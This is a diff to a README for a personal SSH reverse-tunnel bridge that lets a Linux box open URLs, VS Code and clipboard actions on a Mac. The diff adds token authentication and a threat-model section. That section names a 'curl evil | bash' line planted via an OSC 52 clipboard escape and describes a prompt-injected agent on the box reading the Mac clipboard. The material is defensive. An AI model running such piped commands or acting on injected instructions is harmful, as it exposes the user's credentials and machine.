@@ -2,7 +2,7 @@
 
 Reach back to your **Mac** from an SSH session on this Linux box, over a single
 reverse-forwarded port. One launchd listener on the Mac reads one
-`verb<TAB>args` line and dispatches it (via the on-disk `dispatch` script — see
+`token<TAB>verb<TAB>args` line and dispatches it (via the on-disk `dispatch` script — see
 below). Three verbs today:
 
 - **`open <url>`** — open a URL in the Mac browser (`linux/bin/browse`)
@@ -24,7 +24,7 @@ read half uses the `clip-get` verb here. Net: `foo | pbcopy` and `pbpaste` give
 you macOS-parity text clipboard sync in both directions.
 
 ```
-box browse/code-mac/paste-image  ──writes "verb<TAB>args"──▶  127.0.0.1:17603 (box)
+box browse/code-mac/paste-image  ──"token<TAB>verb<TAB>args"──▶  127.0.0.1:17603 (box)
         │ a dedicated autossh reverse tunnel (RemoteForward) carries the port
         │ back to the Mac and redials itself after sleep / a network change
         ▼
@@ -91,11 +91,20 @@ Host claudes-plan-tunnel
     ForwardAgent no
     ControlMaster no
     ControlPath none
-    RemoteForward 17603 127.0.0.1:17603
+    RemoteForward 127.0.0.1:17603 127.0.0.1:17603
     ExitOnForwardFailure yes
     ServerAliveInterval 20
     ServerAliveCountMax 3
 ```
+
+> **Pin the forward to loopback.** `RemoteForward 127.0.0.1:17603 …` (with the
+> explicit `127.0.0.1:` bind address) forces the box-side port to bind loopback
+> **regardless of the box's `GatewayPorts`**. Without the bind address the bind
+> follows `GatewayPorts`, and on a box set to `yes`/`clientspecified` the port
+> would bind `0.0.0.0` — exposing the bridge to your whole LAN/tailnet. Check
+> yours with `sshd -T | grep gatewayports` (want `no`). Even loopback-bound, the
+> port is reachable by **every local user and process on the box** — which is why
+> the token below, not the bind address, is the real trust boundary.
 
 > **Why the Tailscale MagicDNS FQDN for `HostName`:** it resolves and routes on
 > *every* network you roam to, and Tailscale gives a **direct** peer-to-peer path
@@ -170,10 +179,13 @@ If you'd rather not run the script:
    ```
 2. **Add the ssh config blocks shown above** — keepalives on the interactive
    block (no `RemoteForward`), plus the dedicated `claudes-plan-tunnel` block
-   whose `RemoteForward 17603 127.0.0.1:17603` binds 17603 on the box and tunnels
-   it to `127.0.0.1:17603` on the Mac (loopback only). Add the box-side
-   `sshd_config.d/10-keepalive.conf` from
+   whose `RemoteForward 127.0.0.1:17603 127.0.0.1:17603` binds 17603 loopback on
+   the box (the explicit bind address forces loopback regardless of the box's
+   `GatewayPorts`) and tunnels it to `127.0.0.1:17603` on the Mac. Add the
+   box-side `sshd_config.d/10-keepalive.conf` from
    [Persistence](#persistence-across-sleep--roaming).
+3. **Establish the token** (required — the bridge fails closed without it): run
+   [`set-token`](#one-time-token-setup) on the Mac.
 
 Inside an SSH session, `open` and `xdg-open` are aliased to `browse` too, and
 `$BROWSER=browse`, so tools like `gh`, `python -m webbrowser`, and `xdg-open`
@@ -251,15 +263,68 @@ transparently — but with the keepalives above, reconnect is fast and the
 
 ## Security
 
-The listener binds to `127.0.0.1` and only accepts four verbs, each validated
-in `dispatch`: `open` runs `open` only for `http://` / `https://` URLs (no
-`file://` or app-scheme URLs); `code` and `clip-image` both require the host to
-be a bare ssh-alias (`[A-Za-z0-9._-]`) and the path to be absolute before running
-`code --remote` / `scp`; `clip-get` takes no args and just pipes `pbpaste` back.
-Any local process on the Mac could still drive these, but the surface is limited
-to "open a web URL", "open VS Code on an ssh host", "scp the clipboard image to
-an ssh host", and "read the text clipboard" — all low-risk on a personal machine.
-Note `clip-get` lets anything that can reach the loopback port read your
-clipboard; that port is the reverse tunnel (loopback-only on both ends), so the
-exposure is the same as the other verbs. The write direction (`pbcopy`) never
-touches this listener — it's an OSC 52 escape to your own terminal.
+**Read this before copying the setup — the threat model is not "personal
+machine, all low-risk."** The reverse tunnel lands on `127.0.0.1:17603` *on the
+box*, and on Linux that loopback is shared by **every local user and every
+process on the box**, including any coding agents you run there. So the port is
+**not** a trust boundary. Two independent controls matter, plus honest residuals:
+
+**1. A shared-secret token authenticates every request.** The first
+tab-separated field of each request is a token; `dispatch` refuses anything that
+doesn't match `~/.config/mac-bridge/token` (mode 600, same value on both ends,
+established by [`set-token`](#one-time-token-setup)). Because the file is 600, a
+*different* local user on the box (or the tailnet, if the forward ever binds
+non-loopback) can't read it and can't forge a request. This is the control that
+stops another box user from reading your Mac clipboard. `dispatch` **fails
+closed**: no token file → every request refused.
+
+**2. Per-verb validation** stops even an authenticated caller from escalating a
+verb into arbitrary command execution: `open` only accepts `http://`/`https://`
+(no `file://`/app-scheme); `code`/`clip-image` require a bare ssh-alias host
+(`[A-Za-z0-9._-]`) and a **safe** absolute path (`is_safe_abspath`: charset
+`[A-Za-z0-9._/-]`, no `..`) — the strict path charset matters because
+`clip-image`'s dest is spliced into an `scp` remote path, which *legacy* scp
+expands through a shell; `scp` is called by absolute path with `--`; `clip-get`
+takes no args.
+
+**Known residuals (state these plainly if you publish this):**
+
+- **Same-uid code is not contained by the token.** A prompt-injected agent
+  running as *you* on the box reads the same token file, so it can drive every
+  verb — read your Mac clipboard (`clip-get`), open URLs in your logged-in
+  browser (`open`), etc. The token stops *other* users, not *your own*
+  compromised processes. Containing that requires running untrusted-input agents
+  under a **separate uid / container / namespace** that can't reach your loopback
+  or token file. Out of scope for this bridge; tracked as future work.
+- **`clip-get` is a clipboard-read oracle** for anything that holds the token —
+  qualitatively worse than the other verbs (credentials, 2FA codes). If you
+  don't need Mac→box text paste, drop the verb.
+- **OSC 52 clipboard *write* bypasses this listener entirely.** Any content
+  rendered in a tmux pane (agent output, a file in `less`, a web page) that
+  contains an `ESC ] 52 ; c ; … BEL` sequence silently sets your **Mac**
+  clipboard — e.g. planting `curl evil | bash` for you to paste. zsh's bracketed
+  paste (on by default) keeps a pasted newline from auto-running and shows the
+  text, which is the mitigation that costs no prompt; it cannot be fully
+  eliminated without `clipboard-write = ask` (an ongoing prompt). `pbcopy` uses
+  this path; it never touches the token'd listener.
+- **`open` allows `http://localhost` / private IPs**, so an authenticated caller
+  can make your browser hit Mac-local or LAN admin endpoints (browser SSRF/CSRF
+  with your cookies). Restrict the destination if that matters to you.
+
+The Mac-side listener still binds `127.0.0.1` only, and the tunnel is pinned to a
+loopback bind on the box (see the ssh config note above), so nothing here is
+exposed to the network.
+
+### One-time token setup
+
+On the **Mac**, once (and any time you want to rotate/revoke):
+
+```sh
+~/src/dotfiles/darwin/mac-bridge/set-token            # defaults to claudes-plan
+~/src/dotfiles/darwin/mac-bridge/set-token <box-alias>
+```
+
+It generates a random 256-bit token at `~/.config/mac-bridge/token` (mode 600)
+and pushes the identical value to `<box>:~/.config/mac-bridge/token` over your
+normal ssh. Both ends flip together. Until this has run, the bridge fails closed
+(every verb refused) — that's intentional.
